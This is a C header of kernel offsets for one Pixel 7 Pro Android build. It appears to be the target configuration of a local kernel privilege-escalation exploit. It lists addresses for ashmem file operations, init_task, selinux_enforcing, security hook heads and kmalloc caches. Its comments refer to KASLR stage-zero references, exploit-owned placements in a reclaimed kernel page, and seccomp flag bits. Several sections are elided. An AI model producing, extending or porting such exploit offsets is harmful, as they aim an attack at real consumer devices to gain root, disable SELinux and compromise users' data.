/*
 * Pixel 7 Pro (cheetah), CP41.260701.005.
 *
 * Kernel: 6.1.162-android14-11-g752d9c17787d-ab15574904
 * GKI build: ab15574904, revision 752d9c17787d1153f65a3274f0f48d95fc93204c
 *
 * Symbol and structure offsets were extracted from the exact unstripped GKI.
 */

#ifndef OFFSET_H
#define OFFSET_H

#define BUILD_VARIANT_LABEL "cheetah_CP41260701005"
#define BUILD_FINGERPRINT \
  "google/cheetah_beta/cheetah:CinnamonBun/CP41.260701.005/15834971:user/release-keys"
...
/* Kernel symbol offsets from KIMAGE_TEXT_BASE. */

#define ASHMEM_MISC_FOPS_OFF        0x0217d7b0ULL
#define ASHMEM_FOPS_OFF             0x01282268ULL
#define ASHMEM_IOCTL_OFF            0x00c3e37cULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c3ecb4ULL
#define ASHMEM_MMAP_OFF             0x00c3ed0cULL
#define ASHMEM_OPEN_OFF             0x00c3ef2cULL
#define ASHMEM_RELEASE_OFF          0x00c3efb4ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c3f0d4ULL

#define CONFIGFS_READ_ITER_OFF      0x0046516cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0046569cULL
#define COPY_SPLICE_READ_OFF        0x003e6cccULL
#define NOOP_LLSEEK_OFF             0x00399204ULL

#define INIT_TASK_OFF               0x0201f440ULL
#define ROOT_TASK_GROUP_OFF         0x02209580ULL

#define SELINUX_BLOB_SIZES_OFF      0x015d21c8ULL
#define SELINUX_ENFORCING_OFF       0x01fca8c0ULL
#define SECURITY_HOOK_HEADS_OFF     0x015d1ab8ULL

#define KMALLOC_CACHES_OFF          0x015d15f8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x0110a950ULL

/* KASLR stage-zero references. */

#define SLIDE_NFULNL_LOGGER_OFF         0x020127d0ULL
#define SLIDE_LOGGERS_0_1_OFF           0x02012718ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF   0x0227c4e8ULL
#define SLIDE_INIT_TASK_OFF             INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF       ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF         0x0227c4d8ULL

/* Full image addresses used by common.h. */
...
/* Exploit-owned placements within the reclaimed kernel page. */
...
/* struct seccomp and architecture flag bits. */
